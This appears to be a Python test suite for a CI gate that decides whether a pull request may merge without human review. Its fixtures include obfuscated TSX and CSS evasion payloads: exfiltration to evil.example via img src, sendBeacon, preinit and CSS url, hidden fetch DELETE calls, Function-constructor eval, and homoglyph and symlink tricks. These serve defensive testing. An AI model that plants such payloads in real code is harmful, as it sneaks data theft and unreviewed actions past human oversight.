            for name in ("allow.txt", "deny.txt"):
                with (
                    open(os.path.join(ROOT, ".github", "autonomy", name)) as src,
                    open(os.path.join(d, name), "w") as dst,
                ):
                    dst.write(src.read())
            with self.assertRaises(FileNotFoundError):
                ac.load_lists(d)
            with open(os.path.join(d, "imports-allow.txt"), "w") as f:
                f.write("# empty\n")
            with self.assertRaises(ac.ListError):
                ac.load_lists(d)

    def test_unknown_or_bad_content_prefix(self):
        for d in ["code: (\n", "code-cs: [\n", "codes: x\n", "import-allow: x\n"]:
            with self.subTest(d=d), self.assertRaises(ac.ListError):
                ac.parse_lists("x/**\n", "y\n" + d)

    def test_glob_semantics(self):
        rx = lambda g: re.compile(ac.glob_to_regex(g))
        self.assertTrue(
            rx("apps/web/src/components/**/*.tsx").fullmatch(
                "apps/web/src/components/A.tsx"
            )
        )
        self.assertTrue(
            rx("apps/web/src/components/**/*.tsx").fullmatch(
                "apps/web/src/components/a/b/A.tsx"
            )
        )
        self.assertFalse(
            rx("apps/web/src/components/**/*.tsx").fullmatch(
                "apps/web/src/componentsX/A.tsx"
            )
        )
        self.assertTrue(rx("CLAUDE.md").fullmatch("a/b/CLAUDE.md"))
        self.assertTrue(rx("scripts/**").fullmatch("scripts/a/b.py"))
        self.assertFalse(rx("scripts/**").fullmatch("apps/scripts/a.py"))
        self.assertFalse(rx("a/*.ts").fullmatch("a/b/c.ts"))

    def test_real_lists_parse(self):
        self.assertGreater(len(LISTS.allow), 0)
        self.assertGreater(len(LISTS.deny_content), 0)
        self.assertGreater(len(LISTS.deny_imports), 0)

    def test_cli_classify_and_error_exit(self):
        with tempfile.TemporaryDirectory() as d:
            bp = os.path.join(d, "b.json")
            with open(bp, "w") as f:
                json.dump(bundle(fe("AGENTS.md", b"x")), f)
            r = subprocess.run(
                [
                    sys.executable,
                    os.path.join(HERE, "autonomy_class.py"),
                    "classify",
                    "--lists",
                    os.path.join(ROOT, ".github", "autonomy"),
                    "--bundle",
                    bp,
                    "--summary-out",
                    os.path.join(d, "s.md"),
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertEqual(json.loads(r.stdout)["verdict"], "human")
            r = subprocess.run(
                [
                    sys.executable,
                    os.path.join(HERE, "autonomy_class.py"),
                    "classify",
                    "--lists",
                    d,
                    "--bundle",
                    bp,
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(r.returncode, 2)

    def test_summary_escapes_attacker_text(self):
        v = run(bundle(fe("apps/web/src/components/a|`<img>`.tsx")))
        s = ac.summary_markdown(v)
        self.assertNotIn("<img>", s)
        self.assertNotIn("a|`", s)


# -- 4b. collect() against a stub `gh` (no network) --------------------------
# Routes map a URL to a LIST of bodies served in order (the last one repeats),
# so a PR that moves between the first and second read can be simulated.
STUB_GH = r"""#!/usr/bin/env python3
import json, os, sys
fx = json.load(open(os.environ["STUB_FIXTURE"]))
args = [a for a in sys.argv[2:] if a != "--paginate"]
if "--jq" in args:
    args = args[: args.index("--jq")]
url = args[0].split("?")[0]
if url in fx["fail"] or url not in fx["routes"]:
    sys.exit(1)
cpath = os.environ["STUB_FIXTURE"] + ".count"
counts = json.load(open(cpath)) if os.path.exists(cpath) else {}
i = counts.get(url, 0)
counts[url] = i + 1
json.dump(counts, open(cpath, "w"))
seq = fx["routes"][url]
print(json.dumps(seq[min(i, len(seq) - 1)]))
"""


class CollectStub(Base):
    """The network half, run against a stub `gh` serving REST-shaped JSON."""

    SHA = "a" * 40
    BASE = "d" * 40
    BLOB = "b" * 40
    BBLOB = "9" * 40
    F = "apps/web/src/components/play/Pill.tsx"

    def _collect(self, routes, fail=()):
        with tempfile.TemporaryDirectory() as d:
            gh = os.path.join(d, "gh")
            with open(gh, "w") as f:
                f.write(STUB_GH)
            os.chmod(gh, 0o755)
            fx = os.path.join(d, "fx.json")
            with open(fx, "w") as f:
                json.dump({"routes": routes, "fail": list(fail)}, f)
            old = dict(os.environ)
            os.environ["PATH"] = d + os.pathsep + old.get("PATH", "")
            os.environ["STUB_FIXTURE"] = fx
            try:
                return ac.collect("o/r", 7, self.SHA)
            finally:
                os.environ.clear()
                os.environ.update(old)

    def _pr(self, head=None, base=None, ref="v3/main"):
        return {
            "changed_files": 1,
            "head": {"sha": head or self.SHA, "repo": {"full_name": "o/r"}},
            "base": {
                "sha": base or self.BASE,
                "ref": ref,
                "repo": {"full_name": "o/r"},
            },
        }

    def _routes(
        self,
        mode="100644",
        content=STYLE_TSX,
        files=None,
        base=None,
        base_mode="100644",
    ):
        base = content if base is None else base
        return {
            f"repos/o/r/git/trees/{self.BASE}": [
                {
                    "truncated": False,
                    "tree": [
                        {
                            "path": self.F,
                            "mode": base_mode,
                            "sha": self.BBLOB,
                            "type": "blob",
                        }
                    ],
                }
            ],
            f"repos/o/r/git/blobs/{self.BBLOB}": [
                {"encoding": "base64", "content": base64.b64encode(base).decode()}
            ],
            "repos/o/r/pulls/7": [self._pr()],
            f"repos/o/r/compare/{self.BASE}...{self.SHA}": [
                {
                    "files": files
                    or [
                        {
                            "filename": self.F,
                            "status": "modified",
                            "additions": 1,
                            "deletions": 1,
                            "patch": "@@ x",
                        }
                    ]
                }
            ],
            f"repos/o/r/git/trees/{self.SHA}": [
                {
                    "truncated": False,
                    "tree": [
                        {
                            "path": self.F,
                            "mode": mode,
                            "sha": self.BLOB,
                            "type": "blob",
                        },
                        {
                            "path": "apps/web/src/lib/play/types.ts",
                            "mode": "100644",
                            "sha": "e" * 40,
                            "type": "blob",
                        },
                    ],
                }
            ],
            f"repos/o/r/git/blobs/{self.BLOB}": [
                {"encoding": "base64", "content": base64.b64encode(content).decode()}
            ],
        }

    def test_collect_then_classify_auto(self):
        self.assertAuto(self._collect(self._routes()))

    def test_collect_reads_base_and_head_for_content_only(self):
        # R8 end to end through the REST shapes: a JSX text edit is auto; the
        # same edit plus a new attribute is human; a missing / symlinked /
        # unreadable base is human.
        base = b"export const A = () => <p className='x'>Hello there</p>;\n"
        text = b"export const A = () => <p className='x'>Hello again</p>;\n"
        attr = b"export const A = () => <p className='x' id='y'>Hello again</p>;\n"
        self.assertAuto(self._collect(self._routes(content=text, base=base)))
        self.assertHuman(
            self._collect(self._routes(content=attr, base=base)), "R8 code structure"
        )
        self.assertHuman(
            self._collect(self._routes(content=text, base=base, base_mode="120000")),
            "R8 base object is 'symlink'",
        )
        r = self._routes(content=text, base=base)
        r[f"repos/o/r/git/trees/{self.BASE}"][0]["tree"] = []
        self.assertHuman(self._collect(r), "R8 base object is 'missing'")
        r = self._routes(content=text, base=base)
        r[f"repos/o/r/git/trees/{self.BASE}"][0]["truncated"] = True
        self.assertHuman(self._collect(r), "base git tree listing truncated")
        for url in (
            f"repos/o/r/git/trees/{self.BASE}",
            f"repos/o/r/git/blobs/{self.BBLOB}",
        ):
            with self.subTest(url=url):
                self.assertHuman(
                    self._collect(self._routes(content=text, base=base), fail=[url]),
                    "could not read",
                )

    def test_imports_resolve_against_the_head_tree(self):
        ok = b"import { X } from '@/lib/play/types';\nexport const A = X;\n"
        self.assertAuto(self._collect(self._routes(content=ok)))
        gone = b"import { X } from '@/lib/play/notation';\nexport const A = X;\n"
        self.assertHuman(
            self._collect(self._routes(content=gone)), "resolves to no file"
        )

    def test_symlink_seen_through_tree_mode(self):
        # The contents API would follow a symlink and say "file"; the tree
        # mode does not lie.
        self.assertHuman(self._collect(self._routes(mode="120000")), "symlink")
        self.assertHuman(self._collect(self._routes(mode="100755")), "executable")
        self.assertHuman(self._collect(self._routes(mode="160000")), "submodule")

    def test_head_moved_before_first_read_fails_closed(self):
        r = self._routes()
        r["repos/o/r/pulls/7"] = [self._pr(head="c" * 40)]
        self.assertHuman(self._collect(r), "head moved")

    def test_head_or_base_moved_during_read_fails_closed(self):
        # Review R1 #6 (TOCTOU): the file list must not come from a different
        # head than the bytes. The PR is re-read at the end.
        for second in (self._pr(head="c" * 40), self._pr(base="f" * 40)):
            with self.subTest(
                second=second["head"]["sha"][:1] + second["base"]["sha"][:1]
            ):
                r = self._routes()
                r["repos/o/r/pulls/7"] = [self._pr(), second]
                self.assertHuman(self._collect(r), "moved while reading")

    def test_file_list_comes_from_sha_pinned_compare(self):
        # If only the moving pulls/N/files route existed, collect must fail.
        r = self._routes()
        r["repos/o/r/pulls/7/files"] = r.pop(
            f"repos/o/r/compare/{self.BASE}...{self.SHA}"
        )
        self.assertHuman(self._collect(r), "could not read")

    def test_compare_at_300_file_cap_fails_closed(self):
        many = [
            {
                "filename": f"apps/web/src/components/F{i}.tsx",
                "status": "added",
                "patch": "@@",
            }
            for i in range(300)
        ]
        self.assertHuman(self._collect(self._routes(files=many)), "300-file cap")

    def test_non_v3_main_base_is_human(self):
        r = self._routes()
        r["repos/o/r/pulls/7"] = [self._pr(ref="evil-branch")]
        self.assertHuman(self._collect(r), "R0 base branch is 'evil-branch'")

    def test_any_api_failure_fails_closed(self):
        for url in (
            "repos/o/r/pulls/7",
            f"repos/o/r/compare/{self.BASE}...{self.SHA}",
            f"repos/o/r/git/trees/{self.SHA}",
            f"repos/o/r/git/blobs/{self.BLOB}",
        ):
            with self.subTest(url=url):
                self.assertHuman(
                    self._collect(self._routes(), fail=[url]), "could not read"
                )

    def test_truncated_tree_fails_closed(self):
        r = self._routes()
        r[f"repos/o/r/git/trees/{self.SHA}"][0]["truncated"] = True
        self.assertHuman(self._collect(r), "truncated")


# -- 4b. review R2 mutants (PR351-R2-mutants.py), kept as permanent fixtures --
# Round 2 found 17/30 of these `auto` under the regex design. Under the
# content-only design every one is `human` three ways (see ContentOnlyMutants).
R2_MUTANTS = {
    "N1 frames[] alias of window -> fetch DELETE": 'export const A=()=>{ (frames as any)["fe"+"tch"]("/a"+"pi/library/x",{method:"DE"+"LETE"}); return null };\n',
    "N2 parent[]/top[] alias -> fetch": 'export const A=()=>{ (top as any)["fe"+"tch"]("/a"+"pi/set-lists",{method:"POST",body:"{}"}); return null };\n',
    "N3 [].constructor.constructor": 'export const A=()=>{ [][("constr"+"uctor") as any][("constr"+"uctor")]("return this")()["fe"+"tch"]("/a"+"pi/jobs/1/retry",{method:"POST"}); return null };\n',
    "N4 img src string-concat 3rd-party URL": 'export const A=({t}:{t:string})=> <img src={"https:/"+"/evil.example/p?c="+t} alt="" />;\n',
    "N5 react-dom preinit remote script": 'import { preinit } from "react-dom";\nexport const A=()=>{ preinit("https:/"+"/evil.example/x.js",{as:"script"}); return null };\n',
    "N6 navigator[sendBeacon]": 'export const A=()=>{ (navigator as any)["send"+"Beacon"]("https:/"+"/evil.example", "x"); return null };\n',
    "N7 location[href] to API GET": 'export const A=({id}:{id:string})=>{ (location as any)["href"] = "/a"+"pi/jobs/"+id+"/retry"; return null };\n',
    "N8 next/link prefetch to /api via concat": 'import Link from "next/link";\nexport const A=()=> <Link prefetch href={"/a"+"pi/jobs/1/retry"}>x</Link>;\n',
    "N9 dangerouslySetInnerHTML via computed spread key": 'export const A=({h}:{h:string})=> <div {...{["dangerously"+"SetInnerHTML"]:{__html:h}}} />;\n',
    "N10 window.Worker + import.meta.url": 'export const A=()=>{ const W=(window as any).Worker; new W(new URL("./w.ts", import.meta.url)); return null };\n',
    "N11 Object.assign(location,{href})": 'export const A=()=>{ Object.assign(location,{href:"/a"+"pi/jobs/1/retry"}); return null };\n',
    "N12 barrel re-export via allowed component": 'import { RUN_HINT } from "@/components/play/SectionLoop";\nexport const A=()=> <p>{RUN_HINT}</p>;\n',
    "N13 transitive: import allowed fetch component": 'import { SetListPicker } from "@/components/setlists/AddToSetList";\nexport const A=()=> <SetListPicker jobId="j" open onClose={()=>{}} />;\n',
    "N14 server action via computed action key": 'export const A=({go}:{go:(f:FormData)=>Promise<void>})=>{ const p={["act"+"ion"]:go}; return <form {...p}><button>x</button></form> };\n',
    "N15 json import": 'import d from "./data.json";\nexport const A=()=> <p>{String(d)}</p>;\n',
    "N16 next/dynamic": 'import dynamic from "next/dynamic";\nexport const A=dynamic(()=>Promise.resolve(()=>null));\n',
    "N17 import.meta.env": "export const A=()=> <p>{(import.meta as any).env.X}</p>;\n",
    "N18 new Function": 'export const A=()=>{ new Function("x")(); return null };\n',
    "N19 globalThis[fe+tch]": 'export const A=()=>{ (globalThis as any)["fe"+"tch"]("/a"); return null };\n',
    "N20 window[location]": 'export const A=()=>{ (window as any)["location"]="/a"; return null };\n',
}
R2_CSS_MUTANTS = {
    "N21 CSS hex-escaped //host in url()": '.a{background:url("\\2f\\2f evil.example/p.gif")}\n',
    "N22 CSS @import escaped": '@import "\\2f\\2f evil.example/x.css";\n.a{color:red}\n',
}
PLAIN_TSX = b"export const A = () => <p className='x'>Hello there</p>;\n"
PLAIN_CSS = b".a {\n  color: red;\n}\n"
EVIL = "apps/web/src/components/x/Evil.tsx"
EVIL_CSS = "apps/web/src/components/x/b.module.css"


def benign(src: str) -> str:
    """The same source with every double-quoted literal replaced by prose: a
    base that has the mutant's exact SHAPE but harmless values. Head vs this
    base differs in literals only, so R8 must refuse it on literal POSITION
    or VALUE, not on structure."""
    return re.sub(r'"[^"\n]*"', '"Hello world"', src)


def head_only(filename, content, **kw):
    """The review harness's bundle shape: no base version at all."""
    d = fe(filename, content, **kw)
    d.pop("base_content_b64", None)
    d.pop("base_type", None)
    return d


class ContentOnlyMutants(Base):
    """Every R1 (15) and R2 (30) mutant is human (plan R4), three ways:
    head-only (as the harness sends), over a plain base (structure changed),
    and over a same-shape base with benign literals (literal position/value)."""

    def _three_ways(self, name, filename, src, plain):
        with self.subTest(name=name, way="head-only"):
            self.assertHuman(bundle(head_only(filename, src.encode())), "R8 base")
        with self.subTest(name=name, way="plain base"):
            self.assertHuman(bundle(fe(filename, src.encode(), base=plain)), "R8")
        b = benign(src)
        if b == src:
            return  # no literal to vary (e.g. N17): base == head is no change
        with self.subTest(name=name, way="same-shape base"):
            v = self.assertHuman(bundle(fe(filename, src.encode(), base=b.encode())))
            self.assertTrue(any(r.startswith("R8") for r in reasons(v)), reasons(v))

    def test_r1_mutants(self):
        for name, (src, _) in REVIEW_MUTANTS.items():
            self._three_ways(name, EVIL, src, PLAIN_TSX)
        self._three_ways(
            "M15 css //host",
            "apps/web/src/components/x/a.module.css",
            ".a{background:url(//evil.example/p.gif)}\n",
            PLAIN_CSS,
        )
        self.assertEqual(len(REVIEW_MUTANTS) + 1, 15)

    def test_r2_code_mutants(self):
        for name, src in R2_MUTANTS.items():
            self._three_ways(name, EVIL, src, PLAIN_TSX)
        for name, src in R2_CSS_MUTANTS.items():
            self._three_ways(name, EVIL_CSS, src, PLAIN_CSS)

    def test_r2_bundle_mutants(self):
        ok = b"export const A=()=>null;\n"
        cases = {
            "N23 rename deny->allow": fe(
                "apps/web/src/components/x/Plain.tsx",
                ok,
                status="renamed",
                previous_filename="apps/web/src/lib/billing/x.tsx",
            ),
            "N24 symlink mode": fe(EVIL, ok, type="symlink"),
            "N25 mode change status": fe(EVIL, ok, status="changed"),
            "N27 truncated (no patch)": fe(EVIL, ok, patch=None),
            "N28 homoglyph path": fe("apps/web/src/components/x/Evіl.tsx", ok),
            "N29 case variant dir": fe("apps/web/src/Components/x/E.tsx", ok),
        }
        for name, f in cases.items():
            with self.subTest(name=name):
                self.assertHuman(bundle(f))
        with self.subTest(name="N26 >300 / partial list"):
            self.assertHuman(bundle(fe(EVIL, ok), changed_files=301), "partial")
        with self.subTest(name="N30 base_ref not v3/main"):
            self.assertHuman(bundle(fe(EVIL, ok), base_ref="x"), "R0 base branch")
        self.assertEqual(len(R2_MUTANTS) + len(R2_CSS_MUTANTS) + len(cases) + 2, 30)


class ContentOnly(Base):
    """R8: base vs head, parsed. Positive controls first (non-vacuity), then
    negative controls (the same literal edit plus one structural change)."""

    C = "apps/web/src/components/play/Pill.tsx"
    CSS = "apps/web/src/components/play/Pill.module.css"
    BASE = (
        b"import { useState } from 'react';\n\n"
        b"const HINT = 'Tap a stem to hear it';\n\n"
        b"export function Pill({ label }: { label: string }) {\n"
        b"  const [on] = useState(false);\n"
        b"  return (\n"
        b'    <span className="row" title="Stem pill">\n'
        b"      Now playing {label} {on ? 'loud' : 'soft'} {HINT}\n"
        b"    </span>\n"
        b"  );\n"
        b"}\n"
    )

    def edit(self, *pairs, src=None):
        out = self.BASE if src is None else src
        for a, b in pairs:
            self.assertIn(a, out)
            out = out.replace(a, b, 1)
        return out

    def tsx(self, head, base=None):
        return bundle(fe(self.C, head, base=self.BASE if base is None else base))

    # ---- positive controls: auto ------------------------------------------
    def test_jsx_text_change_is_auto(self):
        self.assertAuto(self.tsx(self.edit((b"Now playing", b"Playing now"))))

    def test_text_attribute_and_class_change_is_auto(self):
        self.assertAuto(
            self.tsx(
                self.edit((b'"Stem pill"', b'"Part pill"'), (b'"row"', b'"row wide"'))
            )
        )

    def test_jsx_child_string_and_prose_constant_change_is_auto(self):
        self.assertAuto(
            self.tsx(
                self.edit(
                    (b"'loud'", b"'louder'"),
                    (b"'Tap a stem to hear it'", b"'Tap any stem to hear it'"),
                )
            )
        )

    def test_whitespace_only_reformat_is_auto(self):
        self.assertAuto(
            self.tsx(
                self.edit(
                    (
                        b"const [on] = useState(false);",
                        b"const [on]  =  useState(false) ;",
                    )
                )
            )
        )

    def test_css_colour_change_is_auto(self):
        base = b".row {\n  color: #222;\n  gap: 12px;\n}\n"
        head = b".row {\n  color: #444;\n  gap: 14px;\n}\n"
        self.assertAuto(bundle(fe(self.CSS, head, base=base)))

    def test_real_component_text_and_css_edits_are_auto(self):
        p = "apps/web/src/components/play/Mixer.tsx"
        css = "apps/web/src/components/play/Mixer.module.css"
        src = real(p)
        self.assertIn(b"M mute \xc2\xb7 S solo", src)
        head = src.replace(b"M mute \xc2\xb7 S solo", b"M mutes \xc2\xb7 S solos", 1)
        csrc = real(css).decode()
        old = "color: var(--text-primary);"
        self.assertIn(old, csrc)
        chead = csrc.replace(old, "color: var(--text-secondary);", 1)
        self.assertAuto(
            bundle(fe(p, head, base=src), fe(css, chead.encode(), base=csrc.encode()))
        )

    def test_design_note_text_change_is_auto(self):
        self.assertAuto(
            bundle(
                fe(
                    "docs/design/nav.md",
                    b"# Nav\n\nWrap at 380px.\n",
                    base=b"# Nav\n\nWrap at 360px.\n",
                )
            )
        )

    # ---- negative controls: same literal edit + one structural change -----
    def test_literal_edit_plus_structure_is_human(self):
        t = (b"Now playing", b"Playing now")
        cases = {
            "new identifier": (b"{HINT}", b"{HINT}{label}"),
            "new attribute": (b'title="Stem pill"', b'title="Stem pill" id="p"'),
            "new import": (b"import { useState }", b"import { useState, useId }"),
            "new import line": (b"import {", b"import 'x';\nimport {"),
            "new call": (b"useState(false)", b"useState(Boolean(false))"),
            "renamed member": (b"const [on]", b"const [off]"),
            "number": (b"useState(false)", b"useState(0)"),
            "const to let": (b"const HINT", b"let HINT"),
            "comment": (b"  return (", b"  // eslint-disable-next-line\n  return ("),
            "new spread": (b"<span className", b"<span {...{}} className"),
            "new element": (b"{HINT}", b"{HINT}<b>x</b>"),
        }
        for name, extra in cases.items():
            with self.subTest(name=name):
                self.assertHuman(self.tsx(self.edit(t, extra)), "R8 code structure")

    def test_css_value_edit_plus_structure_is_human(self):
        base = b".row {\n  color: #222;\n}\n"
        for name, head, why in (
            (
                "new property",
                b".row {\n  color: #444;\n  position: fixed;\n}\n",
                "CSS structure",
            ),
            ("new selector", b".row, .x {\n  color: #444;\n}\n", "CSS structure"),
            (
                "new at-rule",
                b"@import 'x.css';\n.row {\n  color: #444;\n}\n",
                "CSS structure",
            ),
            ("comment", b".row {\n  /* x */ color: #444;\n}\n", "CSS structure"),
            (
                "url value",
                b".row {\n  color: #444;\n  background: url(x.png);\n}\n",
                "CSS structure",
            ),
            ("url swap", None, "url"),
            ("backslash", b".row {\n  color: \\23 444;\n}\n", "backslash"),
            ("unbalanced", b".row {\n  color: #444;\n", "unbalanced"),
        ):
            with self.subTest(name=name):
                if head is None:
                    b0 = b".row {\n  background: url(a.png);\n}\n"
                    h0 = b".row {\n  background: url(b.png);\n}\n"
                    self.assertHuman(bundle(fe(self.CSS, h0, base=b0)), why)
                else:
                    self.assertHuman(bundle(fe(self.CSS, head, base=base)), why)

    # ---- literal position and value rules ---------------------------------
    def test_literal_in_non_content_position_is_human(self):
        cases = {
            "href": (
                b"<a href='/a'>Hi there</a>",
                b"<a href='/b'>Hi there</a>",
                "attribute 'href'",
            ),
            "src": (
                b"<img src='a.png' alt='x y' />",
                b"<img src='b.png' alt='x y' />",
                "attribute 'src'",
            ),
            "action": (
                b"<form action='a b'><i>x</i></form>",
                b"<form action='c d'><i>x</i></form>",
                "attribute 'action'",
            ),
            "call argument": (
                b"<p>{f('a b')}</p>",
                b"<p>{f('c d')}</p>",
                "call argument",
            ),
            "member key": (b"<p>{o['a b']}</p>", b"<p>{o['c d']}</p>", "member key"),
            "computed key": (
                b"<p>{({['a b']: 1})}</p>",
                b"<p>{({['c d']: 1})}</p>",
                "computed key",
            ),
            "comparison": (
                b"<p>{x === 'a b' ? 1 : 2}</p>",
                b"<p>{x === 'c d' ? 1 : 2}</p>",
                "non-content position",
            ),
            "tagged template": (
                b"<p>{t`a b`}</p>",
                b"<p>{t`c d`}</p>",
                "tagged template",
            ),
            "style element": (
                b"<style>{'a b'}</style>",
                b"<style>{'c d'}</style>",
                "raw-text element",
            ),
            "Script component": (
                b"<Script>{'a b'}</Script>",
                b"<Script>{'c d'}</Script>",
                "raw-text element",
            ),
            "spread html key": (
                b"<div dangerouslySetInnerHTML={{ __html: 'a b' }} />",
                b"<div dangerouslySetInnerHTML={{ __html: 'c d' }} />",
                "changed value of '__html'",
            ),
        }
        for name, (b0, h0, why) in cases.items():
            with self.subTest(name=name):
                base = (
                    b"export const A = (x: any, o: any, f: any, t: any) => "
                    + b0
                    + b";\n"
                )
                head = (
                    b"export const A = (x: any, o: any, f: any, t: any) => "
                    + h0
                    + b";\n"
                )
                self.assertHuman(bundle(fe(self.C, head, base=base)), why)

    def test_directive_import_and_type_literals_are_human(self):
        cases = (
            (
                b"'use client';\nexport const A = 1;\n",
                b"'use server';\nexport const A = 1;\n",
                "non-content position",
            ),
            (
                b"import x from 'a';\nexport const A = x;\n",
                b"import x from 'b';\nexport const A = x;\n",
                "import/export",
            ),
            (b"export type T = 'a b';\n", b"export type T = 'c d';\n", "type position"),
            (
                b"export const A = (p: any) => p['a b'];\n",
                b"export const A = (p: any) => p['c d'];\n",
                "member key",
            ),
        )
        for base, head, why in cases:
            with self.subTest(head=head):
                self.assertHuman(bundle(fe(self.C, head, base=base)), why)

    def test_literal_values_that_are_not_content_are_human(self):
        cases = {
            "url in text attr": (b"'Stem pill'", b"'https://evil.example'", "URL/path"),
            "path in child": (b"'loud'", b"'/api/jobs'", "URL/path"),
            "protocol-relative": (b"'loud'", b"'//evil.example'", "URL/path"),
            "domain": (b"'loud'", b"'see evil.example now'", "URL/path"),
            "javascript scheme": (b"'loud'", b"'javascript:alert(1)'", "URL/path"),
            "markup": (b"'loud'", b"'<img src=x onerror=y>'", "markup"),
            "entity in JSX text": (b"Now playing", b"Now &lt;b&gt;", "markup"),
            "empty": (b"'loud'", b"''", "empty"),
            "constant without space": (
                b"'Tap a stem to hear it'",
                b"'fetch'",
                "not prose",
            ),
            "constant relative path": (
                b"'Tap a stem to hear it'",
                b"'api/jobs/1 retry'",
                "URL/selector punctuation",
            ),
        }
        for name, (a, b, why) in cases.items():
            with self.subTest(name=name):
                head = self.edit(
                    (a.replace(b"'", b'"') if a not in self.BASE else a, b)
                )
                self.assertHuman(self.tsx(head), why)

    def test_sensitive_key_and_dynamic_file_constants_are_human(self):
        base = b"export const O = { method: 'get it now' };\n"
        head = b"export const O = { method: 'delete it now' };\n"
        self.assertHuman(
            bundle(fe(self.C, head, base=base)), "changed value of 'method'"
        )
        base = b"const K = 'a b c';\nexport const A = (o: any) => o[K];\n"
        head = b"const K = 'd e f';\nexport const A = (o: any) => o[K];\n"
        self.assertHuman(bundle(fe(self.C, head, base=base)), "computed member access")

    def test_parse_errors_and_missing_parser_are_human(self):
        bad = b"export const A = () => <p>;\n"
        self.assertHuman(self.tsx(bad, base=bad), "R8 base: parse error")
        self.assertHuman(self.tsx(self.BASE, base=bad), "R8 base: parse error")
        self.assertHuman(self.tsx(bad), "R8 head: parse error")
        old = os.environ.pop("AUTONOMY_TS_DIR", None)
        try:
            v = ac.classify(LISTS, self.tsx(self.BASE), ts_dir="/nonexistent")
            if ac.find_typescript() is None:
                self.assertEqual(v["verdict"], "human")
                self.assertIn("parser not available", " ".join(reasons(v)))
        finally:
            if old is not None:
                os.environ["AUTONOMY_TS_DIR"] = old

    def test_missing_or_bad_base_is_human(self):
        self.assertHuman(
            bundle(fe(self.C, self.BASE, base=None)), "R8 base content not read"
        )
        self.assertHuman(
            bundle(fe(self.C, self.BASE, base_type="symlink")),
            "R8 base object is 'symlink'",
        )
        self.assertHuman(
            bundle(fe(self.C, self.BASE, base=b"\xff\xfe")), "R8 base content"
        )

    def test_file_type_without_a_parser_is_human(self):
        lists = ac.parse_lists(
            "apps/web/src/components/**\n", "secrets/**\n", "react\n"
        )
        self.assertHuman(
            bundle(fe("apps/web/src/components/x/a.json", b"{}\n", base=b"{ }\n")),
            "no content-only parser",
            lists=lists,
        )

    def test_parser_is_pinned_by_the_lockfile(self):
        with open(os.path.join(ROOT, "pnpm-lock.yaml"), encoding="utf-8") as f:
            want = ac.lockfile_integrity(f.read())
        self.assertTrue(want.startswith("sha512-"))
        with self.assertRaises(ac.ContentError):
            ac.lockfile_integrity("lockfileVersion: '9.0'\n")
        with tempfile.TemporaryDirectory() as d:
            t = os.path.join(d, "t.tgz")
            with open(t, "wb") as f:
                f.write(b"not the real tarball")
            with self.assertRaises(ac.ContentError):
                ac.install_parser(os.path.join(ROOT, "pnpm-lock.yaml"), t, d)


# -- 5. the workflow ----------------------------------------------------------
class WorkflowStatic(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        with open(WORKFLOW, encoding="utf-8") as f:
            cls.src = f.read()
        cls.code = "\n".join(
            ln for ln in cls.src.splitlines() if not ln.lstrip().startswith("#")
        )

    def test_trigger_is_pull_request_target_only(self):
        on = re.search(r"^on:\n((?:  .*\n)+)", self.code, re.MULTILINE).group(1)
        self.assertIn("pull_request_target:", on)
        self.assertNotRegex(
            on, r"^\s+(pull_request|push|workflow_run|workflow_dispatch):", on
        )

    def test_minimal_permissions(self):
        perms = re.search(
            r"^permissions:\n((?:  .*\n)+)", self.code, re.MULTILINE
        ).group(1)
        got = dict(re.findall(r"^\s+([a-z-]+):\s*(\w+)", perms, re.MULTILINE))
        self.assertEqual(
            got, {"checks": "write", "contents": "read", "pull-requests": "read"}
        )
        self.assertEqual(self.code.count("permissions:"), 1, "no job-level widening")

    def test_every_uses_is_sha_pinned(self):
        uses = re.findall(r"uses:\s*(\S+)", self.code)
        self.assertTrue(uses)
        for u in uses:
            self.assertRegex(u, r"^[\w.-]+/[\w.-]+@[0-9a-f]{40}$", u)

    def test_checks_out_base_only_without_credentials(self):
        self.assertIn("ref: v3/main", self.code)
        self.assertIn("if: github.event.pull_request.base.ref == 'v3/main'", self.code)
        self.assertIn("persist-credentials: false", self.code)
        for bad in ("head.ref", "head.repo", "merge_commit_sha", "refs/pull"):
            self.assertNotIn(bad, self.code, bad)

    def test_no_pr_text_interpolated_into_run_scripts(self):
        # ${{ }} may only appear in `with:`/`env:` values, never inside run: blocks.
        in_run = False
        for ln in self.code.splitlines():
            s = ln.strip()
            if s.startswith("run:"):
                in_run = True
                continue
            if (
                in_run
                and re.match(r"^\s{6,8}(- |[a-z-]+:)", ln)
                and not ln.startswith(" " * 10)
            ):
                in_run = False
            if in_run:
                self.assertNotIn("${{", ln, ln)

    def test_runs_only_base_checker_and_posts_named_check(self):
        self.assertIn("python3 scripts/autonomy_class.py collect", self.code)
        self.assertIn("--lists .github/autonomy", self.code)
        self.assertIn('name: "autonomy-class"', self.code)
        self.assertIn("if: always()", self.code)
        # No package manager runs (no install scripts); `pnpm-lock.yaml` is
        # only READ, for the parser's pinned hash.
        self.assertNotRegex(self.code, r"\b(npm|npx|pnpm|yarn|pip)\b(?![-.])")

    def test_parser_is_hash_checked_before_use(self):
        self.assertIn("install-parser", self.code)
        self.assertIn("--lockfile pnpm-lock.yaml", self.code)
        self.assertIn('--typescript "$RUNNER_TEMP/ts/package"', self.code)
        self.assertLess(
            self.code.index("install-parser"), self.code.index(" classify ")
        )
        # the tarball URL is built from the checker's constant, never PR data
        self.assertIn("registry.npmjs.org/typescript/-/typescript-$ver.tgz", self.code)
        self.assertNotIn("labels", self.code)
        self.assertNotIn("/merge", self.code)

    def test_fails_closed_to_neutral_human(self):
        self.assertRegex(
            self.code,
            r'if \[ "\$VERDICT" = "auto" \]; then\s+conclusion=success; title=auto\s+else\s+conclusion=neutral; title=human',
        )


if __name__ == "__main__":
    unittest.main(verbosity=1)
